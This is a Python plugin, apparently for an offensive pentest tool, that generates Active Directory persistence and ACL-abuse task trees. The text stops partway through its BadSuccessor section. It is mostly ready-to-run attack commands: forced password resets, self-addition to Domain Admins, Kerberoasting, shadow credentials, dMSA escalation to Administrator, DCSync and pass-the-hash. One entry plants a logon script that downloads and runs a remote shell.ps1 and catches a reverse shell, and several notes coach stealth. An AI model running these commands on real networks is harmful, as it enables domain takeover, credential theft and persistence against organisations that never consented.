"""
Active Directory Persistence & ACL Abuse plugin

Generates tasks for advanced AD persistence techniques including:
- ACL manipulation (WriteDACL, WriteOwner, GenericAll abuse)
- Shadow Credentials (MSDS-KeyCredentialLink)
- BadSuccessor gMSA/dMSA privilege escalation
- Golden gMSA/dMSA attacks
- Domain controller persistence (DCShadow, skeleton key, custom SSP)
- SID History injection
- DSRM credential abuse
- Diamond tickets (stealthy golden ticket variant)
- GPO delegation abuse

Extracted from HackTricks AD methodology documentation
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class ADPersistencePlugin(ServicePlugin):
    """Active Directory persistence and ACL abuse plugin"""

    @property
    def name(self) -> str:
        return "ad-persistence"

    @property
    def default_ports(self) -> List[int]:
        return []  # Manual trigger only

    @property
    def service_names(self) -> List[str]:
        return ['ad-persistence', 'active-directory-persistence']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """Manual trigger only - returns False for auto-detection"""
        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate Active Directory persistence task tree"""
        domain = service_info.get('domain', 'DOMAIN.LOCAL')
        dc_ip = service_info.get('dc_ip', target)
        username = service_info.get('username', '<USERNAME>')

        tasks = {
            'id': 'ad-persistence-enum',
            'name': f'Active Directory Persistence: {domain}',
            'type': 'parent',
            'children': []
        }

        # Phase 1: ACL Abuse & Manipulation
        tasks['children'].append(self._create_acl_abuse_attacks(target, domain, dc_ip, username))

        # Phase 2: Shadow Credentials Attack
        tasks['children'].append(self._create_shadow_credentials_attacks(target, domain, dc_ip, username))

        # Phase 3: gMSA/dMSA Attacks (BadSuccessor, Golden)
        tasks['children'].append(self._create_gmsa_attacks(target, domain, dc_ip))

        # Phase 4: Domain Controller Persistence
        tasks['children'].append(self._create_dc_persistence_attacks(target, domain, dc_ip))

        # Phase 5: SID History & Diamond Tickets
        tasks['children'].append(self._create_sid_history_attacks(target, domain, dc_ip, username))

        # Phase 6: GPO Delegation Abuse
        tasks['children'].append(self._create_gpo_abuse_attacks(target, domain, dc_ip, username))

        return tasks

    def _create_acl_abuse_attacks(self, target: str, domain: str, dc_ip: str, username: str) -> Dict[str, Any]:
        """ACL manipulation techniques"""
        return {
            'id': 'acl-abuse',
            'name': 'ACL Abuse & Manipulation',
            'type': 'parent',
            'children': [
                # GenericAll on User
                {
                    'id': 'genericall-user-enum',
                    'name': 'Enumerate GenericAll Rights on Users',
                    'type': 'command',
                    'metadata': {
                        'command': f'Get-ObjectAcl -SamAccountName <TARGET_USER> -ResolveGUIDs | ? {{$_.ActiveDirectoryRights -match "GenericAll"}}',
                        'description': 'Find users you have GenericAll permissions over (full control)',
                        'tags': ['OSCP:HIGH', 'ACL_ABUSE', 'ENUM'],
                        'flag_explanations': {
                            '-SamAccountName': 'Target user to check ACLs',
                            '-ResolveGUIDs': 'Translate GUIDs to human-readable names',
                            '| ?': 'PowerShell filter for GenericAll rights',
                            'ActiveDirectoryRights': 'Permissions granted on the object'
                        },
                        'success_indicators': [
                            'GenericAll permission found for your user',
                            'IdentityReference shows your account or group',
                            'Can reset password, modify attributes, add SPNs'
                        ],
                        'failure_indicators': [
                            'No results - no GenericAll permissions',
                            'Access denied - need domain user credentials',
                            'Object not found - invalid username'
                        ],
                        'next_steps': [
                            'Reset target password: net user <user> <newpass> /domain',
                            'Targeted Kerberoasting: Set-DomainObject -Identity <user> -Set @{serviceprincipalname="fake/SPN"}',
                            'Shadow Credentials: Add certificate-based credential to user',
                            'ASREPRoasting: Disable pre-auth with Set-DomainObject -XOR @{UserAccountControl=4194304}'
                        ],
                        'alternatives': [
                            'BloodHound: path from your user to target with GenericAll edge',
                            'Linux: bloodyAD --host <dc> -d <domain> -u <user> -p <pass> get object <target> --attr nTSecurityDescriptor',
                            'PowerView: Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReference -match "<username>"}'
                        ],
                        'notes': 'GenericAll = full control. Can change password without knowing old password. From Linux use bloodyAD or Samba net rpc'
                    }
                },
                # GenericAll - Password Reset
                {
                    'id': 'genericall-reset-password',
                    'name': 'GenericAll: Reset Target Password',
                    'type': 'command',
                    'metadata': {
                        'command': f'net user <TARGET_USER> NewP@ssw0rd123! /domain',
                        'description': 'Reset target user password (requires GenericAll or ForceChangePassword)',
                        'tags': ['OSCP:HIGH', 'ACL_ABUSE', 'TAKEOVER'],
                        'flag_explanations': {
                            '<TARGET_USER>': 'User you have GenericAll on',
                            'NewP@ssw0rd123!': 'New password (complex - 12+ chars, upper, lower, digit, special)',
                            '/domain': 'Execute on domain controller (not local)'
                        },
                        'success_indicators': [
                            'Command completed successfully',
                            'Can authenticate as target: runas /user:<domain>\\<target> cmd',
                            'Password works: crackmapexec smb <dc> -u <target> -p <newpass>'
                        ],
                        'failure_indicators': [
                            'Access denied - insufficient permissions',
                            'Password complexity not met - add special chars',
                            'User not found - check spelling/domain'
                        ],
                        'next_steps': [
                            'Authenticate as target user: runas /user:<domain>\\<target> cmd',
                            'Check target group membership: net user <target> /domain',
                            'Lateral movement: psexec.py <domain>/<target>:<pass>@<target_workstation>',
                            'Dump credentials if DA: secretsdump.py <domain>/<target>:<pass>@<dc>'
                        ],
                        'alternatives': [
                            'PowerShell: Set-DomainUserPassword -Identity <target> -AccountPassword (ConvertTo-SecureString "NewP@ss" -AsPlainText -Force)',
                            'Linux (SAMR): net rpc password <target> "NewP@ss" -U <domain>/<user>%<pass> -S <dc>',
                            'BloodyAD: bloodyAD --host <dc> -d <domain> -u <user> -p <pass> set password <target> "NewP@ss"',
                            'rpcclient: setuserinfo2 <target> 23 "NewP@ss"'
                        ],
                        'notes': 'Leaves event 4724 (password reset) on DC. Stealthier: Shadow Credentials (no password change)'
                    }
                },
                # Targeted Kerberoasting
                {
                    'id': 'genericall-kerberoast',
                    'name': 'GenericAll: Targeted Kerberoasting',
                    'type': 'command',
                    'metadata': {
                        'command': f'Set-DomainObject -Identity <TARGET_USER> -Set @{{serviceprincipalname="http/fake.{domain}"}} -Verbose',
                        'description': 'Add fake SPN to user account to make it Kerberoastable (requires GenericAll)',
                        'tags': ['OSCP:HIGH', 'KERBEROS', 'ACL_ABUSE'],
                        'flag_explanations': {
                            '-Identity': 'User to add SPN to (requires GenericAll)',
                            '-Set': 'Set attribute value',
                            'serviceprincipalname': 'SPN attribute (makes user Kerberoastable)',
                            'http/fake': 'Fake SPN (any format works: service/host)',
                            '-Verbose': 'Show detailed output'
                        },
                        'success_indicators': [
                            'SPN added successfully',
                            'Kerberoast hash extracted: Rubeus.exe kerberoast /user:<target>',
                            'Hash format: $krb5tgs$23$*<user>$...'
                        ],
                        'failure_indicators': [
                            'Access denied - need GenericAll/GenericWrite',
                            'SPN already exists - user already has SPNs',
                            'Operation failed - insufficient permissions'
                        ],
                        'next_steps': [
                            'Extract hash: Rubeus.exe kerberoast /user:<target> /nowrap',
                            'Crack offline: hashcat -m 13100 hash.txt wordlist.txt',
                            'Remove SPN after cracking: Set-DomainObject -Identity <target> -Clear serviceprincipalname',
                            'If cracked, authenticate: crackmapexec smb <dc> -u <target> -p <cracked_pass>'
                        ],
                        'alternatives': [
                            'Impacket: targetedKerberoast.py -u <user> -p <pass> -d <domain>',
                            'Manual SPN set: setspn -s http/fake <target>',
                            'BloodyAD: bloodyAD set object <target> servicePrincipalName -v "http/fake"'
                        ],
                        'notes': 'Stealthier than password reset. Clean up SPN after cracking. Use strong fake SPN to avoid detection'
                    }
                },
                # GenericAll on Group
                {
                    'id': 'genericall-group-add',
                    'name': 'GenericAll on Group: Add Self to Privileged Group',
                    'type': 'command',
                    'metadata': {
                        'command': f'net group "Domain Admins" {username} /add /domain',
                        'description': 'Add yourself to Domain Admins (requires GenericAll/WriteProperty on group)',
                        'tags': ['OSCP:HIGH', 'PRIVESC', 'ACL_ABUSE'],
                        'flag_explanations': {
                            '"Domain Admins"': 'Target group (can be any group you have rights on)',
                            f'{username}': 'User to add (yourself)',
                            '/add': 'Add member to group',
                            '/domain': 'Execute on domain controller'
                        },
                        'success_indicators': [
                            'Command completed successfully',
                            'Verify: net user <you> /domain | findstr "Domain Admins"',
                            'Can access DC: dir \\\\<dc>\\C$'
                        ],
                        'failure_indicators': [
                            'Access denied - need GenericAll/WriteProperty/WriteMember',
                            'Group not found - check spelling',
                            'Already a member - user already in group'
                        ],
                        'next_steps': [
                            'Verify membership: net group "Domain Admins" /domain',
                            'DCSync attack: secretsdump.py <domain>/<you>:<pass>@<dc>',
                            'Access DC: psexec.py <domain>/<you>:<pass>@<dc>',
                            'Create golden ticket with KRBTGT hash'
                        ],
                        'alternatives': [
                            'PowerView: Add-NetGroupUser -UserName <you> -GroupName "Domain Admins" -Domain <domain>',
                            'AD Module: Add-ADGroupMember -Identity "Domain Admins" -Members <you>',
                            'Linux (BloodyAD): bloodyAD add groupMember "Domain Admins" <you>',
                            'Linux (Samba): net rpc group addmem "Domain Admins" <you> -U <domain>/<user>%<pass> -S <dc>'
                        ],
                        'notes': 'Instant DA. Logs event 4728 (member added to group). WinRM access if Remote Management Users nested'
                    }
                },
                # WriteDACL Abuse
                {
                    'id': 'writedacl-grant-genericall',
                    'name': 'WriteDACL: Grant Yourself GenericAll',
                    'type': 'command',
                    'metadata': {
                        'command': f'Add-DomainObjectAcl -Rights All -TargetIdentity <TARGET_OBJECT> -PrincipalIdentity {username} -Verbose',
                        'description': 'Grant yourself GenericAll on target object (requires WriteDACL)',
                        'tags': ['OSCP:HIGH', 'ACL_ABUSE', 'PERSISTENCE'],
                        'flag_explanations': {
                            '-Rights All': 'Grant all permissions (GenericAll)',
                            '-TargetIdentity': 'Object to modify ACL on (user, group, computer, domain)',
                            '-PrincipalIdentity': 'Who gets the permissions (yourself)',
                            '-Verbose': 'Show detailed operation'
                        },
                        'success_indicators': [
                            'ACE added successfully',
                            'Verify: Get-ObjectAcl -Identity <target> -ResolveGUIDs | ?{$_.IdentityReference -match "<you>"}',
                            'Can now modify target object'
                        ],
                        'failure_indicators': [
                            'Access denied - need WriteDACL/WriteOwner permission',
                            'Object not found - invalid DN or name',
                            'Operation failed - insufficient privileges'
                        ],
                        'next_steps': [
                            'Now have GenericAll - reset password, add SPN, add to groups',
                            'Domain object: Grant DCSync rights with DS-Replication-Get-Changes',
                            'User object: Reset password or shadow credentials',
                            'Group object: Add yourself as member'
                        ],
                        'alternatives': [
                            'ADSI Edit: Manually edit nTSecurityDescriptor attribute',
                            'PowerShell ADSI: $ADSI = [ADSI]"LDAP://<target>"; $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule...',
                            'Impacket dacledit: dacledit.py -action write -rights FullControl -principal <you> -target <target>',
                            'BloodyAD: bloodyAD add genericAll <target> <you>'
                        ],
                        'notes': 'WriteDACL = can modify permissions. Chain: WriteDACL → GenericAll → reset password/DCSync. Stealthy persistence'
                    }
                },
                # ForceChangePassword
                {
                    'id': 'forcechangepassword-reset',
                    'name': 'ForceChangePassword: Reset Password',
                    'type': 'command',
                    'metadata': {
                        'command': f'Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword (ConvertTo-SecureString "NewP@ss123!" -AsPlainText -Force) -Verbose',
                        'description': 'Reset user password without knowing current password (requires ExtendedRight User-Force-Change-Password)',
                        'tags': ['OSCP:HIGH', 'ACL_ABUSE'],
                        'flag_explanations': {
                            '-Identity': 'Target user to reset password',
                            '-AccountPassword': 'New password as SecureString',
                            'ConvertTo-SecureString': 'Convert plaintext to secure string',
                            '-AsPlainText': 'Input is plaintext password',
                            '-Force': 'Force conversion without confirmation'
                        },
                        'success_indicators': [
                            'Password changed successfully',
                            'Can authenticate: runas /user:<domain>\\<target> cmd',
                            'Works: crackmapexec smb <dc> -u <target> -p NewP@ss123!'
                        ],
                        'failure_indicators': [
                            'Access denied - need ForceChangePassword permission',
                            'Password complexity not met',
                            'User protected by AdminSDHolder'
                        ],
                        'next_steps': [
                            'Login as user: runas /user:<domain>\\<target> powershell',
                            'Check privileges: whoami /groups',
                            'Lateral movement if admin: psexec <target_workstation>',
                            'Dump credentials from workstation'
                        ],
                        'alternatives': [
                            'net user <target> NewPass /domain',
                            'rpcclient: setuserinfo2 <target> 23 "NewPass"',
                            'Linux (Samba): net rpc password <target> "NewPass" -U <domain>/<user>%<pass> -S <dc>',
                            'PowerView interactive: Set-DomainUserPassword -Identity <target>'
                        ],
                        'notes': 'ExtendedRight User-Force-Change-Password allows password reset. Less powerful than GenericAll but still dangerous'
                    }
                },
                # WriteOwner Abuse
                {
                    'id': 'writeowner-takeover',
                    'name': 'WriteOwner: Change Object Ownership',
                    'type': 'command',
                    'metadata': {
                        'command': f'Set-DomainObjectOwner -Identity <TARGET_OBJECT> -OwnerIdentity {username} -Verbose',
                        'description': 'Change object owner to yourself (requires WriteOwner), then grant GenericAll',
                        'tags': ['OSCP:HIGH', 'ACL_ABUSE'],
                        'flag_explanations': {
                            '-Identity': 'Target object (user, group, OU, domain)',
                            '-OwnerIdentity': 'New owner (yourself)',
                            '-Verbose': 'Show operation details'
                        },
                        'success_indicators': [
                            'Owner changed successfully',
                            'Verify: Get-DomainObject <target> | select name,ntsecuritydescriptor',
                            'Can now modify object permissions'
                        ],
                        'failure_indicators': [
                            'Access denied - need WriteOwner permission',
                            'Protected object - AdminSDHolder resets owner',
                            'Object not found'
                        ],
                        'next_steps': [
                            'Grant yourself GenericAll: Add-DomainObjectAcl -Rights All -TargetIdentity <target> -PrincipalIdentity <you>',
                            'Now have full control over object',
                            'User: reset password or shadow credentials',
                            'Group: add yourself as member'
                        ],
                        'alternatives': [
                            'ADSI Edit: Security → Advanced → Owner tab → Change owner',
                            'PowerShell ADSI: $ADSI.psbase.ObjectSecurity.SetOwner(...)',
                            'PowerView chain: Set-DomainObjectOwner + Add-DomainObjectAcl'
                        ],
                        'notes': 'WriteOwner → change owner to yourself → WriteDACL (owner implicit) → GenericAll. Two-step takeover'
                    }
                },
                # GenericWrite on User - Logon Script
                {
                    'id': 'genericwrite-logonscript',
                    'name': 'GenericWrite: Set Malicious Logon Script',
                    'type': 'command',
                    'metadata': {
                        'command': f'Set-ADObject -SamAccountName <TARGET_USER> -PropertyName scriptpath -PropertyValue "\\\\{target}\\share\\evil.ps1"',
                        'description': 'Set logon script that executes on user login (requires GenericWrite)',
                        'tags': ['OSCP:MEDIUM', 'ACL_ABUSE', 'PERSISTENCE'],
                        'flag_explanations': {
                            '-SamAccountName': 'Target user account',
                            '-PropertyName scriptpath': 'Logon script attribute',
                            '-PropertyValue': 'UNC path to your malicious script',
                            '\\\\<ip>\\share\\evil.ps1': 'SMB share hosting payload'
                        },
                        'success_indicators': [
                            'Script path set successfully',
                            'Verify: Get-ADUser <target> -Properties scriptPath',
                            'Script executes on next user login'
                        ],
                        'failure_indicators': [
                            'Access denied - need GenericWrite/WriteProperty',
                            'Path invalid - user cannot access share',
                            'Script blocked by AppLocker/WDAC'
                        ],
                        'next_steps': [
                            'Host SMB share: impacket-smbserver share . -smb2support',
                            'Create evil.ps1: IEX(New-Object Net.WebClient).DownloadString("http://<ip>/shell.ps1")',
                            'Wait for user login',
                            'Catch reverse shell: nc -lvnp 443'
                        ],
                        'alternatives': [
                            'PowerView: Set-DomainObject -Identity <target> -Set @{scriptpath="\\\\<ip>\\share\\evil.ps1"}',
                            'Direct LDAP: ldapmodify -D <user> -w <pass> (modify scriptPath attribute)',
                            'SYSVOL poisoning: Modify existing scripts in \\\\<dc>\\SYSVOL\\<domain>\\scripts\\'
                        ],
                        'notes': 'GenericWrite = write any attribute. Logon script runs in user context. Clean up after: Set-ADObject -Clear scriptpath'
                    }
                }
            ]
        }

    def _create_shadow_credentials_attacks(self, target: str, domain: str, dc_ip: str, username: str) -> Dict[str, Any]:
        """Shadow Credentials (MSDS-KeyCredentialLink) attack"""
        return {
            'id': 'shadow-credentials',
            'name': 'Shadow Credentials Attack',
            'type': 'parent',
            'children': [
                # Theory
                {
                    'id': 'shadow-creds-theory',
                    'name': 'Shadow Credentials: Theory',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Certificate-based Kerberos authentication without password change',
                        'notes': '''Shadow Credentials Overview:
- Requires: GenericAll/GenericWrite/WriteProperty on msDS-KeyCredentialLink attribute
- Prerequisites: Windows Server 2016+ DC with server auth certificate, 2016+ functional level
- Attack: Add public key to msDS-KeyCredentialLink, authenticate with private key, extract NTLM hash
- Advantage: No password change (stealthier than password reset)
- Tools: Whisker (Windows), pyWhisker (Linux), ShadowSpray (mass exploitation)
- Detection: Monitor 4662 events for msDS-KeyCredentialLink modifications'''
                    }
                },
                # Enumerate Vulnerable Targets
                {
                    'id': 'shadow-creds-enum',
                    'name': 'Enumerate Users/Computers for Shadow Credentials',
                    'type': 'command',
                    'metadata': {
                        'command': f'Get-DomainObject -LDAPFilter "(objectClass=user)" | ? {{($_ | Get-ObjectAcl -ResolveGUIDs).ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteProperty"}}',
                        'description': 'Find users/computers you can perform shadow credentials attack on',
                        'tags': ['OSCP:HIGH', 'ENUM', 'SHADOW_CREDS'],
                        'flag_explanations': {
                            '-LDAPFilter': 'LDAP query filter (objectClass=user for users)',
                            'Get-ObjectAcl': 'Get ACLs for each object',
                            '-ResolveGUIDs': 'Translate permission GUIDs to names',
                            '-match': 'Filter for write permissions'
                        },
                        'success_indicators': [
                            'Objects found with GenericAll/GenericWrite',
                            'Can write msDS-KeyCredentialLink attribute',
                            'Domain functional level 2016+',
                            'DC has server authentication certificate'
                        ],
                        'failure_indicators': [
                            'No results - insufficient permissions',
                            'Functional level too low (< 2016)',
                            'DC missing required certificate'
                        ],
                        'next_steps': [
                            'Verify functional level: Get-ADDomain | select DomainMode',
                            'Check DC certificate: certutil -dcinfo',
                            'Target high-value accounts: DA, service accounts',
                            'Perform shadow credentials attack with Whisker/pyWhisker'
                        ],
                        'alternatives': [
                            'BloodHound: Query for WriteProperty edges to msDS-KeyCredentialLink',
                            'PowerView: Find-InterestingDomainAcl | ?{$_.ObjectType -match "KeyCredentialLink"}',
                            'Manual LDAP: search for objects you have write access to'
                        ],
                        'notes': 'Shadow credentials = Kerberos PKINIT. Requires modern AD (2016+). Check functional level first'
                    }
                },
                # Windows - Whisker
                {
                    'id': 'shadow-creds-whisker-add',
                    'name': 'Shadow Credentials: Add KeyCredential (Whisker)',
                    'type': 'command',
                    'metadata': {
                        'command': f'Whisker.exe add /target:<TARGET_USER> /domain:{domain} /dc:{dc_ip} /path:C:\\temp\\cert.pfx /password:P@ssw0rd!',
                        'description': 'Add shadow credential to target user (Windows - Whisker)',
                        'tags': ['OSCP:HIGH', 'SHADOW_CREDS', 'WINDOWS'],
                        'flag_explanations': {
                            'add': 'Add new KeyCredential to target',
                            '/target': 'Target username or computer (user$ for computer)',
                            '/domain': 'Target domain FQDN',
                            '/dc': 'Domain controller IP/hostname',
                            '/path': 'Output path for certificate (PFX format)',
                            '/password': 'Password for PFX certificate'
                        },
                        'success_indicators': [
                            'KeyCredential added successfully',
                            'Certificate saved to specified path',
                            'DeviceID returned (save for cleanup)',
                            'Can request TGT with certificate'
                        ],
                        'failure_indicators': [
                            'Access denied - need GenericAll/GenericWrite on target',
                            'Functional level too low',
                            'DC certificate missing',
                            'Target protected by AdminSDHolder'
                        ],
                        'next_steps': [
                            'Request TGT: Rubeus.exe asktgt /user:<target> /certificate:cert.pfx /password:P@ssw0rd! /getcredentials /nowrap',
                            'Extract NTLM hash from TGT response',
                            'Pass-the-hash: sekurlsa::pth /user:<target> /ntlm:<hash> /domain:<domain>',
                            'Cleanup: Whisker.exe remove /target:<target> /deviceid:<id>'
                        ],
                        'alternatives': [
                            'pyWhisker (Linux): python3 pywhisker.py -d <domain> -u <user> -p <pass> --target <target> --action add',
                            'Certipy (Linux): certipy shadow auto -u <user>@<domain> -p <pass> -account <target>',
                            'Manual: Modify msDS-KeyCredentialLink with LDAP tools'
                        ],
                        'notes': 'Whisker requires .NET 4.7.2+. Save DeviceID for cleanup. Stealthier than password reset (no 4724 event)'
                    }
                },
                # Linux - pyWhisker
                {
                    'id': 'shadow-creds-pywhisker',
                    'name': 'Shadow Credentials: Add KeyCredential (pyWhisker)',
                    'type': 'command',
                    'metadata': {
                        'command': f'python3 pywhisker.py -d {domain} -u {username} -p <PASSWORD> --target <TARGET_USER> --action add --filename cert',
                        'description': 'Add shadow credential to target (Linux - pyWhisker)',
                        'tags': ['OSCP:HIGH', 'SHADOW_CREDS', 'LINUX'],
                        'flag_explanations': {
                            '-d': 'Target domain',
                            '-u': 'Your username (authenticated user)',
                            '-p': 'Your password',
                            '--target': 'Target user/computer to add credential',
                            '--action add': 'Add new KeyCredential',
                            '--filename': 'Output certificate filename (PFX)'
                        },
                        'success_indicators': [
                            'KeyCredential added successfully',
                            'Certificate files created: cert.pfx, cert.ccache',
                            'DeviceID displayed (save for cleanup)',
                            'Can authenticate with certificate'
                        ],
                        'failure_indicators': [
                            'LDAP bind failed - wrong credentials',
                            'Access denied - insufficient permissions',
                            'Functional level incompatible',
                            'Target not found'
                        ],
                        'next_steps': [
                            'Request TGT: PKINITtools gettgtpkinit.py -cert-pfx cert.pfx -pfx-pass <pass> <domain>/<target> target.ccache',
                            'Get hash: PKINITtools getnthash.py -key <key> <domain>/<target>',
                            'Use hash: crackmapexec smb <dc> -u <target> -H <hash>',
                            'Cleanup: pywhisker.py --action remove --deviceid <id>'
                        ],
                        'alternatives': [
                            'Certipy shadow: certipy shadow auto -u <user>@<domain> -p <pass> -account <target>',
                            'Impacket PKINIT: getTGT.py -cert cert.pfx -pfx-pass <pass> <domain>/<target>',
                            'Whisker (Windows): Whisker.exe add /target:<target>'
                        ],
                        'notes': 'pyWhisker = Linux version of Whisker. Supports export to ccache for Impacket. Clean up DeviceID after attack'
                    }
                },
                # ShadowSpray - Mass Exploitation
                {
                    'id': 'shadow-creds-shadowspray',
                    'name': 'Shadow Credentials: Mass Exploitation (ShadowSpray)',
                    'type': 'command',
                    'metadata': {
                        'command': f'ShadowSpray.exe -d {domain} -u {username} -p <PASSWORD> --cleanup',
                        'description': 'Exploit GenericWrite/GenericAll at scale across all domain users',
                        'tags': ['OSCP:MEDIUM', 'SHADOW_CREDS', 'MASS_EXPLOIT'],
                        'flag_explanations': {
                            '-d': 'Target domain',
                            '-u': 'Authenticated username',
                            '-p': 'Password',
                            '--cleanup': 'Remove KeyCredentials after extraction (recommended)'
                        },
                        'success_indicators': [
                            'Enumeration completed',
                            'KeyCredentials added to multiple targets',
                            'TGTs acquired for vulnerable accounts',
                            'NTLM hashes extracted'
                        ],
                        'failure_indicators': [
                            'No vulnerable targets found',
                            'Authentication failed',
                            'Functional level incompatible',
                            'Mass LDAP writes detected/blocked'
                        ],
                        'next_steps': [
                            'Review extracted hashes',
                            'Identify high-value accounts (DA, service accounts)',
                            'Pass-the-hash to access systems',
                            'Verify cleanup completed'
                        ],
                        'alternatives': [
                            'Manual iteration with Whisker/pyWhisker on each target',
                            'BloodHound query + scripted Whisker calls',
                            'PowerView + Whisker loop'
                        ],
                        'notes': 'ShadowSpray = automated mass shadow credentials. High risk of detection. Use --cleanup flag. Test on small subset first'
                    }
                }
            ]
        }

    def _create_gmsa_attacks(self, target: str, domain: str, dc_ip: str) -> Dict[str, Any]:
        """gMSA/dMSA attacks (BadSuccessor, Golden)"""
        return {
            'id': 'gmsa-dmsa-attacks',
            'name': 'gMSA/dMSA Attacks',
            'type': 'parent',
            'children': [
                # BadSuccessor - Enumerate
                {
                    'id': 'badsuccessor-enum-ous',
                    'name': 'BadSuccessor: Enumerate Vulnerable OUs',
                    'type': 'command',
                    'metadata': {
                        'command': f'Get-BadSuccessorOUPermissions.ps1 -Domain {domain}',
                        'description': 'Find OUs where you can create dMSA objects (BadSuccessor prerequisite)',
                        'tags': ['OSCP:HIGH', 'ENUM', 'BADSUCCESSOR'],
                        'flag_explanations': {
                            '-Domain': 'Target domain FQDN',
                            'Get-BadSuccessorOUPermissions.ps1': 'Unit 42 script to enumerate vulnerable OUs'
                        },
                        'success_indicators': [
                            'OUs found with Create Child msDS-DelegatedManagedServiceAccount',
                            'Your account has create permissions in OU',
                            'Can create dMSA objects'
                        ],
                        'failure_indicators': [
                            'No vulnerable OUs found',
                            'Script not found - download from Unit42 repo',
                            'Access denied - need authenticated user'
                        ],
                        'next_steps': [
                            'Verify Windows Server 2025 DC exists (required)',
                            'Create dMSA in vulnerable OU',
                            'Link to Administrator account (BadSuccessor)',
                            'Authenticate as dMSA to inherit DA privileges'
                        ],
                        'alternatives': [
                            'Manual: Get-Acl for each OU, check nTSecurityDescriptor for Create Child msDS-DelegatedMSA',
                            'BloodHound: Query for CreateChild edges to OUs',
                            'PowerView: Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.ObjectType -match "DelegatedMSA"}'
                        ],
                        'notes': 'BadSuccessor = Windows Server 2025 vulnerability. 91% of orgs have vulnerable OU permissions. No patch available'
                    }
                },
                # BadSuccessor - Create dMSA
                {
                    'id': 'badsuccessor-create-dmsa',
                    'name': 'BadSuccessor: Create Malicious dMSA',
                    'type': 'command',
                    'metadata': {
                        'command': f'New-ADServiceAccount -Name attacker_dMSA -DNSHostName {domain} -Path "OU=VulnerableOU,DC={domain.split(".")[0]},DC={domain.split(".")[1]}"',
                        'description': 'Create dMSA in vulnerable OU (step 1 of BadSuccessor)',
                        'tags': ['OSCP:HIGH', 'BADSUCCESSOR', 'PERSIST'],
                        'flag_explanations': {
                            '-Name': 'dMSA name (any name works)',
                            '-DNSHostName': 'DNS hostname (domain FQDN)',
                            '-Path': 'OU distinguished name (vulnerable OU from enum)'
                        },
                        'success_indicators': [
                            'Service account created successfully',
                            'dMSA object exists in OU',
                            'Can modify msDS-ManagedAccountPrecededByLink attribute'
                        ],
                        'failure_indicators': [
                            'Access denied - need Create Child permission',
                            'OU not found - check DN syntax',
                            'Windows Server 2025 DC not available'
                        ],
                        'next_steps': [
                            'Link to target: Set-ADServiceAccount attacker_dMSA -Add @{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=..."}',
                            'Mark complete: Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}',
                            'Request TGT: Rubeus.exe asktgt /user:attacker_dMSA$ /password:<pwd>',
                            'Inherit Administrator privileges'
                        ],
                        'alternatives': [
                            'SharpSuccessor: Full automated exploitation',
                            'NetExec badsuccessor module',
                            'BadSuccessor.ps1: Pentest-Tools-Collection script'
                        ],
                        'notes': 'Step 1/3 of BadSuccessor. Next: link to target account, mark state=2. Requires WS2025 DC'
                    }
                },
                # BadSuccessor - Link to Target
                {
                    'id': 'badsuccessor-link-target',
                    'name': 'BadSuccessor: Link dMSA to Target Account',
                    'type': 'command',
                    'metadata': {
                        'command': f'Set-ADServiceAccount attacker_dMSA -Add @{{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC={domain.split(".")[0]},DC={domain.split(".")[1]}"}}',
                        'description': 'Link dMSA to Administrator (or any DA) - step 2 of BadSuccessor',
                        'tags': ['OSCP:HIGH', 'BADSUCCESSOR', 'PERSIST'],
                        'flag_explanations': {
                            'attacker_dMSA': 'Your created dMSA',
                            '-Add': 'Add attribute value',
                            'msDS-ManagedAccountPrecededByLink': 'Predecessor link attribute',
                            '"CN=Administrator..."': 'DN of target to impersonate (usually Administrator or DA)'
                        },
                        'success_indicators': [
                            'Attribute set successfully',
                            'Verify: Get-ADServiceAccount attacker_dMSA -Properties msDS-ManagedAccountPrecededByLink',
                            'Link points to Administrator'
                        ],
                        'failure_indicators': [
                            'Access denied - need write permission on dMSA',
                            'Target DN invalid - check syntax',
                            'Attribute not writable'
                        ],
                        'next_steps': [
                            'Mark migration complete: Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}',
                            'Wait for replication (few seconds)',
                            'Request TGT as dMSA',
                            'Token will contain Administrator SIDs (DA/EA)'
                        ],
                        'alternatives': [
                            'ldapmodify: Modify attribute via LDAP',
                            'SharpSuccessor: Automates entire chain',
                            'PowerShell ADSI: Direct attribute modification'
                        ],
                        'notes': 'Step 2/3. Links dMSA to victim. Can link to ANY user (Administrator, DA, service account)'
                    }
                },
                # BadSuccessor - Complete Migration
                {
                    'id': 'badsuccessor-complete',
                    'name': 'BadSuccessor: Complete Migration & Authenticate',
                    'type': 'command',
                    'metadata': {
                        'command': f'Set-ADServiceAccount attacker_dMSA -Replace @{{msDS-DelegatedMSAState=2}}',
                        'description': 'Mark migration complete - step 3 of BadSuccessor',
                        'tags': ['OSCP:HIGH', 'BADSUCCESSOR', 'PERSIST'],
                        'flag_explanations': {
                            '-Replace': 'Replace attribute value',
                            'msDS-DelegatedMSAState': 'Migration state attribute',
                            '2': 'Migration completed (0=none, 1=in-progress, 2=complete)'
                        },
                        'success_indicators': [
                            'State set to 2 (completed)',
                            'Can authenticate as dMSA: Rubeus.exe asktgt /user:attacker_dMSA$',
                            'TGT contains Administrator SIDs',
                            'Can access DA resources: dir \\\\DC01\\C$'
                        ],
                        'failure_indicators': [
                            'Access denied',
                            'KDC does not honor predecessor link',
                            'Authentication failed'
                        ],
                        'next_steps': [
                            'Get password: Get-ADServiceAccountPassword attacker_dMSA',
                            'Request TGT: Rubeus.exe asktgt /user:attacker_dMSA$ /password:<pwd> /getcredentials',
                            'Verify SIDs: klist (should show DA groups)',
                            'Access DC: dir \\\\<dc>\\C$',
                            'DCSync: secretsdump.py <domain>/attacker_dMSA$@<dc> -hashes :<hash>'
                        ],
                        'alternatives': [
                            'SharpSuccessor: Automated full chain',
                            'NetExec badsuccessor module',
                            'Rubeus with /dmsa flag: Rubeus.exe asktgt /user:attacker_dMSA$ /dmsa'
